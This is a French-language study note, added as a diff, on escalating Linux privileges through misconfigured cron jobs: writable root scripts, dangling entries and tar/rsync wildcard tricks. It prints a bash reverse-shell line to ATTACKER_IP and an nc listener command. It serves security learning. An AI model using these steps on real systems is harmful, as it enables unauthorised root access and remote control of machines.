@@ -1,0 +1,75 @@
+📝 Note sur l’élévation de privilèges Linux : Cron Jobs
+🔹 1. Rappel sur cron
+
+Cron jobs = tâches planifiées qui s’exécutent automatiquement à intervalles définis.
+
+Chaque utilisateur peut avoir sa crontab (crontab -l).
+
+Les cron jobs système sont stockés dans :
+
+/etc/crontab
+
+/etc/cron.d/
+
+/var/spool/cron/ (par utilisateur)
+
+👉 Ces tâches tournent avec les privilèges de leur propriétaire (donc souvent root pour les cron systèmes).
+
+🔹 2. Escalade de privilèges via cron
+Cas 1 : Script modifiable par l’utilisateur
+
+Si un script exécuté par cron appartient à root mais est écrivable par un utilisateur, alors on peut modifier son contenu.
+
+Exemple :
+
+* * * * * root /home/user/backup.sh
+
+
+Si backup.sh est modifiable : remplacer le contenu par une reverse shell.
+
+Cas 2 : Script manquant (dangling cron job)
+
+Les admins suppriment le script mais oublient de supprimer la ligne cron.
+
+Si le PATH défini dans /etc/crontab inclut /home/user, il suffit de créer un script du même nom (ex: antivirus.sh) et il sera exécuté par root.
+
+Cas 3 : Exploitation indirecte
+
+Même si on ne peut pas modifier directement le script, il peut utiliser un outil exploitable (ex: tar, rsync, find) → exploiter leurs options dangereuses (--checkpoint-action, wildcards, etc.).
+
+🔹 3. Méthodologie d’exploitation
+
+Lister les cron jobs :
+
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+
+
+Vérifier permissions des scripts appelés (est-ce que tu peux les modifier ?).
+
+Vérifier si un script manque → recréer avec une backdoor.
+
+Si modifiable → insérer une reverse shell (en utilisant bash, python, perl, ou nc selon disponibilité).
+Exemple (bash) :
+
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+
+Lancer un listener côté attaquant :
+
+nc -lvnp 4444
+
+🔹 4. Points à retenir
+
+Les cron jobs mal configurés sont fréquents dans des environnements avec faible maturité sécurité.
+
+Toujours :
+
+Vérifier les permissions d’écriture.
+
+Vérifier les scripts supprimés mais toujours référencés.
+
+Vérifier les outils utilisés dans les scripts (tar, find, rsync, etc.).
+
+👉 Un cron mal configuré = escalade facile vers root.
